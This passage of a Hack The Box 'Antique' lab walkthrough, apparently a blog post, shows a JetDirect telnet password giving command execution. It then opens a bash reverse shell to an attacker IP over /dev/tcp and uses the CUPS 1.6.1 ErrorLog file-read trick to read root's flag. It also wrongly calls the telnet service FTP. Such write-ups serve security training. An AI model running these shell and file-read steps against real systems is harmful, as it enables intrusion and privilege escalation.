<p>I couldn&rsquo;t determine the FTP version, but for port 9797 and 9090, it&rsquo;s revealed that they are using the same version of CUPS, which is 1.6.1.  If you notice the copyright at the bottom (2007-2012), the CUPS version seems pretty old.</p>
<p>Throwing CUPS on <code>searchsploit</code> pops up a bunch of exploits, but on Google, there is a metasploit module for 1.6.1: <a href="https://www.rapid7.com/db/modules/post/multi/escalate/cups_root_file_read/">File Read vulnerability</a>.</p>
<p><div class="img-container"><img src="imgs/image-20211016043745272.png" alt="image-20211016043745272"  /></div>
</p>
<p>To use that module I&rsquo;ll need a system access first.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-lp">Shell as lp</h3>
<h4 id="ftp-access">FTP Access</h4>
<p>The password I obtained from SNMP enumeration works on FTP.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «antique» «10.10.14.13» 
$ nc -vn 10.10.11.107 <span class="m">23</span>  
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.107<span class="o">]</span> <span class="m">23</span> <span class="o">(</span>telnet<span class="o">)</span> open

HP JetDirect


Password: P@ssw0rd@123!!123

Please <span class="nb">type</span> <span class="s2">&#34;?&#34;</span> <span class="k">for</span> HELP
&gt; ?

To Change/Configure Parameters Enter:
Parameter-name: value &lt;Carriage Return&gt;

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation <span class="o">(</span>enter <span class="m">0</span> <span class="k">for</span> default<span class="o">)</span>
default-gw: address in dotted notation <span class="o">(</span>enter <span class="m">0</span> <span class="k">for</span> default<span class="o">)</span>
syslog-svr: address in dotted notation <span class="o">(</span>enter <span class="m">0</span> <span class="k">for</span> default<span class="o">)</span>
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string <span class="o">(</span><span class="m">32</span> chars max<span class="o">)</span>
host-name: alpha-numeric string <span class="o">(</span>upper <span class="k">case</span> only, <span class="m">32</span> chars max<span class="o">)</span>
dhcp-config: <span class="m">0</span> to disable, <span class="m">1</span> to <span class="nb">enable</span>
allow: &lt;ip&gt; <span class="o">[</span>mask<span class="o">]</span> <span class="o">(</span><span class="m">0</span> to clear, list to display, <span class="m">10</span> max<span class="o">)</span>

addrawport: &lt;TCP port num&gt; <span class="o">(</span>&lt;TCP port num&gt; 3000-9000<span class="o">)</span>
deleterawport: &lt;TCP port num&gt;
listrawport: <span class="o">(</span>No parameter required<span class="o">)</span>

exec: execute system commands <span class="o">(</span><span class="nb">exec</span> id<span class="o">)</span>
exit: quit from telnet session
&gt;
</code></pre></div><p>Since it allows me to execute system commands, I can read the user flag directly from FTP.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; <span class="nb">exec</span> id
<span class="nv">uid</span><span class="o">=</span>7<span class="o">(</span>lp<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>7<span class="o">(</span>lp<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>7<span class="o">(</span>lp<span class="o">)</span>,19<span class="o">(</span>lpadmin<span class="o">)</span>
<span class="nb">exec</span> ls -l
total <span class="m">8</span>
-rwxr-xr-x <span class="m">1</span> lp   lp <span class="m">1959</span> Sep <span class="m">27</span> 07:12 telnet.py
-rw-r--r-- <span class="m">1</span> root lp   <span class="m">33</span> Oct <span class="m">15</span> 05:14 user.txt
&gt; <span class="nb">exec</span> cat user.txt
a2aeb10a550bd9c53c2213491432ad52
</code></pre></div><h4 id="reverse-shell">Reverse Shell</h4>
<p>I will execute the reverse shell command, and catch it on my nc listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; <span class="nb">exec</span> which bash
/usr/bin/bash
&gt; <span class="nb">exec</span> bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.13/53 0&gt;&amp;1&#34;</span>
</code></pre></div><p>On my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «antique» «10.10.14.13» 
$ nc -nvlp <span class="m">53</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
connect to <span class="o">[</span>10.10.14.13<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.107<span class="o">]</span> <span class="m">45184</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>821<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
lp@antique:~$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
lp@antique:~$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
lp@antique:~$ ^Z
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">9729</span> suspended  nc -nvlp <span class="m">53</span>
→ kali@kali «antique» «10.10.14.13» 
$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">9729</span> continued  nc -nvlp <span class="m">53</span>

lp@antique:~$ 
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="file-read">File read</h3>
<h4 id="cups-root-file-read">CUPS Root File read</h4>
<p>The description of the metasploit module for the file read vulnerability on CUPS 1.6.1 states that:</p>
<blockquote>
<p>This module exploits a vulnerability in CUPS &lt; 1.6.2, an open source printing system. CUPS allows members of the <strong>lpadmin group</strong> to make changes to the cupsd.conf configuration. When the user visits the Error Log page in the web interface, the cupsd daemon (running with setuid root) reads the Error Log path and echoes it as plaintext.  &hellip;[SNIP]&hellip;</p>
</blockquote>
<p>Now since I&rsquo;ve a shell session as <strong>lpadmin</strong>, I can try to exploit the file read vulnerability manually.</p>
<p>Not sure if it was exposed by other players with <code>socat</code> to external, but the CUPS web interface is originally listening on localhost 631.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">lp@antique:/home/lp$ netstat -tlpn
<span class="o">(</span>Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.<span class="o">)</span>
Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:23              0.0.0.0:*               LISTEN      828/python3         
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9090            0.0.0.0:*               LISTEN      19247/socat         
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9797            0.0.0.0:*               LISTEN      21137/socat         
tcp6       <span class="m">0</span>      <span class="m">0</span> ::1:631                 :::*                    LISTEN      -                   
lp@antique:/home/lp$ ps aux <span class="p">|</span> grep socat
lp         <span class="m">19247</span>  0.0  0.0   <span class="m">9028</span>  <span class="m">3484</span> pts/1    S+   17:35   0:00 socat tcp-listen:9090,fork TCP:127.0.0.1:631
lp         <span class="m">21137</span>  0.0  0.0   <span class="m">9028</span>  <span class="m">3368</span> ?        S    18:38   0:00 socat tcp-listen:9797,fork tcp:127.0.0.1:631
lp         <span class="m">27338</span>  0.0  0.0   <span class="m">8500</span>   <span class="m">748</span> pts/4    S+   22:32   0:00 grep socat
</code></pre></div><p><a href="https://www.cups.org/doc/man-cupsctl.html">cupsctl</a> is available on this system. Using that utility, I can change the error log path to the file path that I want to read, which in this case is the root flag, and then send a GET request to <code>localhost:631/admin/log/error_log</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">lp@antique:/home/lp$ cupsctl <span class="nv">ErrorLog</span><span class="o">=</span><span class="s2">&#34;/root/root.txt&#34;</span>
lp@antique:/home/lp$ curl -s localhost:631/admin/log/error_log
5d6d4...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
